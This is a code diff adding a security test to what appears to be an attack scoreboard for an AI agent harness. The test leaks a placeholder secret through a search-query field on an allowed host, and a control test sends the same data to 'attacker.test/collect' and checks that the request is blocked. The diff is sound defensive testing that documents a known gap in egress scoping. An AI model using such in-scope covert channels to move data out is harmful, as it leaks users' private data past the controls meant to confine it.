@@ -20,6 +20,7 @@ from ..scoreboard import Attack, Verdict
 from ..support import (
     METADATA_IP,
     PUBLIC_IP,
+    Approver,
     FakeResponse,
     fake_httpx,
     judge,
@@ -28,6 +29,7 @@ from ..support import (
     refused_with,
     resolver,
     scratch,
+    session,
 )
 
 
@@ -427,6 +429,86 @@ def _uncredentialed_redirect_is_followed() -> None:
         )
 
 
+# --- scope abuse, as distinct from scope escape ------------------------------
+#
+# Every scope attack above tries to get *out*. This one stays in. The scope
+# answers "which host", and the question it never asks is "what is being sent" —
+# so a permitted host that accepts a free-form field the attacker can read back
+# later is a channel that is in scope by construction.
+
+_STOLEN = "contents-of-a-private-file"
+
+
+def _in_scope_covert_channel() -> Verdict:
+    """Encode the data into a field of a request the scope plainly allows.
+
+    Nothing exotic: a search query on the one site this session is confined to.
+    It is a GET, so no approval fires; it is in scope, so the guard has no
+    objection. The attacker reads the site's query logs afterwards."""
+    approver = Approver(default=True)
+    with (
+        resolver(),
+        fake_httpx() as client,
+        session(
+            "scope-abuse", allowed_hosts=["example.com"], approver=approver
+        ) as sess,
+    ):
+        sess.broker.call(
+            "http",
+            "request",
+            None,
+            "GET",
+            "https://example.com/search",
+            params={"q": _STOLEN},
+        )
+        audit = (sess.workspace.root / "audit.jsonl").read_text()
+        return judge(
+            attacker_won=_STOLEN in client.wire_text(),
+            # The request really was made through the broker, under a real
+            # policy, and really was recorded — so "the data got out" is a
+            # statement about the scope and not about a half-wired session.
+            ran="http.request" in audit and bool(sess.policy.require_approval),
+            ran_evidence=(
+                "the request never went through the broker, or the session had "
+                "no policy in force — nothing here would be about the scope"
+            ),
+        )
+
+
+def _the_scope_is_really_confining_this_session() -> None:
+    """Control, and the whole distinction this attack rests on: the very same
+    session refuses the very same exfiltration aimed one host to the left. So
+    what gets the data out is the destination being permitted, not the scope
+    being absent."""
+    from pyharness.security.egress import EgressBlocked
+
+    with (
+        resolver(),
+        fake_httpx(),
+        session(
+            "scope-abuse-ctl",
+            allowed_hosts=["example.com"],
+            approver=Approver(default=True),
+        ) as sess,
+    ):
+        try:
+            sess.broker.call(
+                "http",
+                "request",
+                None,
+                "GET",
+                "https://attacker.test/collect",
+                params={"q": _STOLEN},
+            )
+        except EgressBlocked:
+            return
+        raise RuntimeError(
+            "the same session let the same data go to an out-of-scope host — the "
+            "scope is not in force at all here, so this attack would be showing "
+            "an unconfined session rather than the limit of confinement"
+        )
+
+
 def _credentialed_request_follows_redirect() -> Verdict:
     """The exfil this defends: a site answers an authenticated request with a
     redirect to the attacker, and the credential is replayed on the next hop."""
@@ -582,6 +664,35 @@ ATTACKS = [
         ),
         run=_redirect_to_metadata,
         control=_redirect_is_actually_followed,
+    ),
+    Attack(
+        id="scope-abuse-in-scope-channel",
+        surface="egress",
+        description="hide the data in a free-form field of an allowed host",
+        property=(
+            "Confining a session to a set of sites confines the data it holds, "
+            "not merely the hosts it can name."
+        ),
+        run=_in_scope_covert_channel,
+        control=_the_scope_is_really_confining_this_session,
+        known_gap=(
+            "The scope vets a destination. It does not look at the payload, and "
+            "deliberately so: deciding whether an outbound field carries "
+            "something sensitive is content filtering, which cannot be done "
+            "reliably and is a posture this threat model does not take. So any "
+            "permitted host that accepts free text the attacker can read back "
+            "later — a search query, an issue comment, a support ticket, a "
+            "filename — is a channel that is in scope by construction. Every "
+            "other scope attack on this board tries to get *out* and is refused; "
+            "this one stays in, and the honest boundary is that the perimeter "
+            "constrains where data can go, not what can be encoded into an "
+            "allowed destination. What bounds it: the scope is chosen by a human "
+            "who is shown it, narrowing the scope narrows the channel to hosts "
+            "that were deliberately trusted, and every request is in the audit "
+            "chain — so this is not a silent channel, it is a permitted one. A "
+            "session handling data that must not leak should be scoped to hosts "
+            "with no readable free-form surface, or given no network at all."
+        ),
     ),
     Attack(
         id="credential-replayed-on-redirect",
